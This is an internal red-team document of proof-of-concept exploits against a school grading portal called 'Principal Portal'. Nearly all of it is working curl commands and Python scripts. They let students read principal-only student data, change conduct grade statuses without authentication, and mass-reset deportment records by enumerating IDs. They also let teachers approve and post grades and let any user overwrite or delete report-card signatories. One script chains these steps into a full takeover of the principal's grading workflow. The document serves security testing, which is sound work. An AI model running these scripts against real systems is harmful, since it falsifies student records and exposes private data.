# Principal Portal — Proof-of-Concept Exploits
**Date:** June 09, 2026  
**Module:** Principal Portal  
**Reviewer:** Internal Red Team  
**Classification:** Internal Use Only

---

> **Warning:** All PoCs require an active session (authenticated) unless otherwise noted. Replace `TARGET` with the application base URL and provide a valid `SESSION_COOKIE` obtained through normal login.

---

## PoC PR-01 — Any Authenticated User Reads Principal-Only Data
**Finding:** PR-01 | **Severity:** CRITICAL | **Middleware:** `auth` only (no role check)

### Setup
```bash
# Log in as a student (lowest privilege level)
curl -c cookies.txt -b cookies.txt -X POST "http://TARGET/login" \
     -d "email=20260001&password=123456&_token=<csrf>"
```

### Exploit — Read Full Enrolled Student List
```bash
# Any logged-in user reads all enrolled students in any section
curl -b cookies.txt "http://TARGET/principal/section/students/enrolled?section=1&acad=3&syid=2&gradelevel=7"
```

### Exploit — Read Grade Submission Status for All Sections
```bash
curl -b cookies.txt "http://TARGET/principal/grades/status?syid=2&section=1&levelid=7&acadprogid=3"
```

### Exploit — Read SF9 Signatory Names for All Academic Programs
```bash
curl -b cookies.txt "http://TARGET/setup/signatories/list/sf9?syid=2"
# Returns: [{"id":1,"name":"Maria Santos","title":"School Principal","acadprogid":3}, ...]
```

### Exploit — Read Student Honors/Rankings
```bash
curl -b cookies.txt "http://TARGET/searchStudentWithHonors?gradelevel=7&sy=2&quarter=1&section=1"
# Full student ranking list with general average grades
```

---

## PoC PR-02 — Unauthenticated Deportment Grade Status Write
**Finding:** PR-02 | **Severity:** CRITICAL | **Middleware:** None

### Exploit — Set Bulk Student Conduct Grades to "Posted" Without Credentials
```bash
# No cookies, no session — completely unauthenticated
# Set students 10, 11, 12 in section 3 to gradestatus=5 (Posted)
curl "http://TARGET/posting/grade/update-grade-status" \
     -G \
     --data-urlencode "array[]=10" \
     --data-urlencode "array[]=11" \
     --data-urlencode "array[]=12" \
     --data-urlencode "syid=2" \
     --data-urlencode "sectionid=3" \
     --data-urlencode "quarter_ID=1" \
     --data-urlencode "status=5" \
     --data-urlencode "hpsid=1"
```

Expected response:
```json
[{"status":200,"statusCode":"success","message":"Succesfully Approved!"}]
```

### Exploit — Reset Individual Student Conduct Grade to "Not Submitted"
```bash
# Unauthenticated — reset student's conduct grade back to status 1 (Not Submitted)
curl "http://TARGET/posting/grade/update-stud-gradstatus?studid=<student_deportment.id>&sy=2&quarter=1&status=1"
```

Expected response:
```json
[{"status":200,"statusCode":"success","message":"Succesfully Changed!","currentStudStatus":null}]
```

### Bulk Reset All Deportment Records (Denial of Service)
```python
#!/usr/bin/env python3
"""Reset all deportment records for a school year — no credentials needed."""
import requests

TARGET = "http://TARGET"

# Enumerate student_deportment record IDs
for studid in range(1, 500):
    r = requests.get(f"{TARGET}/posting/grade/update-stud-gradstatus",
                     params={"studid": studid, "sy": 2, "quarter": 1, "status": 1})
    if r.status_code == 200:
        print(f"[+] Reset deportment for record {studid}")
```

---

## PoC PR-03 — Authenticated User Posts and Approves Their Own Grades
**Finding:** PR-03 | **Severity:** HIGH | **Middleware:** `auth, isDefaultPass`

### Setup
```bash
# Log in as a teacher (type 1) who has already changed their default password
curl -c teacher_cookies.txt -b teacher_cookies.txt -X POST "http://TARGET/login" \
     -d "email=20260045&password=MyNewPassword&_token=<csrf>"
```

### Exploit — Approve a Grade Submission
```bash
# Teacher approves their own or any other grade submission
# gdid = the grades.id record (obtainable from /principal/grades/status)
curl -b teacher_cookies.txt \
     "http://TARGET/posting/grade/approve?gdid=123&studid=55&quarter=2&syid=2&semid=1"
```

### Exploit — Post Grades to Permanent Record
```bash
curl -b teacher_cookies.txt \
     "http://TARGET/posting/grade/post?gdid=123&studid=55&quarter=2&syid=2&semid=1"
```

### Exploit — Subject-Level Self-Approval (No Student ID Required)
```bash
# Approve an entire subject's grade batch as non-principal
curl -b teacher_cookies.txt \
     "http://TARGET/posting/grade/subject/approve?gdid=123&teacherid=45"

# Post the entire subject
curl -b teacher_cookies.txt \
     "http://TARGET/posting/grade/subject/post?gdid=123&teacherid=45"
```

---

## PoC PR-04 — Any Authenticated User Overwrites SF9 Report Card Signatory
**Finding:** PR-04 | **Severity:** HIGH | **Middleware:** `auth` only

### Setup
```bash
# Log in as any user — even a student
curl -c student_cookies.txt -X POST "http://TARGET/login" \
     -d "email=20260001&password=123456&_token=<csrf>"
```

### Exploit — Overwrite the Signatory Name Printed on All SF9 Forms
```bash
# First, find the existing signatory IDs
curl -b student_cookies.txt "http://TARGET/setup/signatories/list/sf9?syid=2"
# Returns: [{"id":1,"name":"Maria Santos","title":"School Principal","acadprogid":3}]

# Overwrite signatory for Grade School (acadprogid=3) report cards
curl -b student_cookies.txt \
     "http://TARGET/setup/signatories/update/sf9?id=1&name=Hacked%20User&title=Unauthorized%20Principal&acadprogid=3&syid=2"

# All subsequent SF9 report cards now print "Hacked User / Unauthorized Principal"
```

### Exploit — Delete All Signatories (SF9 forms print blank name field)
```bash
# Enumerate and delete all signatory records
for ID in 1 2 3 4 5; do
    curl -b student_cookies.txt "http://TARGET/setup/signatories/delete/sf9?id=${ID}"
done
```

### Exploit — Create Rogue Signatory for Senior High School
```bash
curl -b student_cookies.txt \
     "http://TARGET/setup/signatories/create/sf9?syid=2&name=Rogue%20Principal&title=Impersonator&acadprogid=5"
```

---

## PoC PR-05 — IDOR in Section Profile via Unhandled Decrypt Exception
**Finding:** PR-05 | **Severity:** MEDIUM | **Middleware:** `auth`

### Exploit — Enumerate All Section Profiles by Integer ID
```python
#!/usr/bin/env python3
"""Enumerate section profiles using plain integer IDs (decrypt exception silently swallowed)."""
import requests

TARGET  = "http://TARGET"
COOKIES = {"laravel_session": "<session_cookie>"}

for section_id in range(1, 200):
    url = f"{TARGET}/principalPortalSectionProfile/{section_id}"
    r   = requests.get(url, cookies=COOKIES, allow_redirects=False)

    # 200 = valid section, 302 = not found / redirect
    if r.status_code == 200 and "sectionname" in r.text.lower():
        print(f"[+] Section {section_id}: found — {len(r.text)} bytes")
    else:
        print(f"[-] Section {section_id}: {r.status_code}")
```

Expected: all section profiles returned in order without needing encrypted IDs.

---

## PoC PR-06 — Unauthenticated Route Triggers 500 Error (Information Disclosure)
**Finding:** PR-06 | **Severity:** MEDIUM | **Middleware:** None

### Exploit — Trigger Stack Trace on Unauthenticated Access
```bash
# No cookies — calls auth()->user()->id on a no-middleware route
curl -v "http://TARGET/posting/grade/get-deportment-details?sy=2&quarter=1"
# HTTP 500 — stack trace may be exposed in non-production environments
# Error: "Trying to get property 'id' of non-object"
```

---

## PoC BUG-PR-02 — Crash `loadtable()` With Missing Setup Data
**Finding:** BUG-PR-02 | **Severity:** Medium Bug

### Exploit — Crash the Deportment Table Load With Invalid Section/Quarter
```bash
# Authenticated — request deportment table for section with no HPS setup
curl -b cookies.txt \
     "http://TARGET/posting/grade/load-class-table?syid=2&sectionid=999&quarterid=99"
# HTTP 500: "Trying to get property 'deportment_setupid' of non-object"
# Stack trace exposed; authenticated users can crash the principal's deportment interface
```

---

## PoC PR-01 Extended — Full Principal Workflow Takeover
Combines PR-01 and PR-03 to demonstrate complete Principal workflow impersonation by a teacher:

```python
#!/usr/bin/env python3
"""
Full Principal workflow takeover as a non-principal authenticated user.
1. Read grade status for all sections
2. Approve all pending grade batches
3. Post all approved grade batches
For authorized penetration testing only.
"""
import requests, re

TARGET  = "http://TARGET"
session = requests.Session()

# Step 1: Login as teacher (non-principal)
login_page = session.get(f"{TARGET}/login")
csrf = re.search(r'name="_token"\s+value="([^"]+)"', login_page.text).group(1)
session.post(f"{TARGET}/login", data={"email": "20260045", "password": "MyNewPassword", "_token": csrf})
print("[+] Logged in as teacher")

# Step 2: Read grade status for section 1
grades = session.get(f"{TARGET}/principal/grades/status",
                     params={"syid": "2", "section": "1", "levelid": "7", "acadprogid": "3"})
print(f"[+] Grade status page retrieved ({len(grades.text)} bytes)")

# Step 3: Approve and post pending grade IDs (replace with known IDs from step 2)
for gdid in [120, 121, 122]:
    # Approve
    r = session.get(f"{TARGET}/posting/grade/approve",
                    params={"gdid": gdid, "studid": 1, "quarter": 2, "syid": 2})
    print(f"[+] Approved grade {gdid}: {r.json()}")

    # Post
    r = session.get(f"{TARGET}/posting/grade/post",
                    params={"gdid": gdid, "studid": 1, "quarter": 2, "syid": 2})
    print(f"[+] Posted grade {gdid}: {r.json()}")

print("[+] All grades posted without principal authorization")
```

---

*End of Principal Portal PoC*
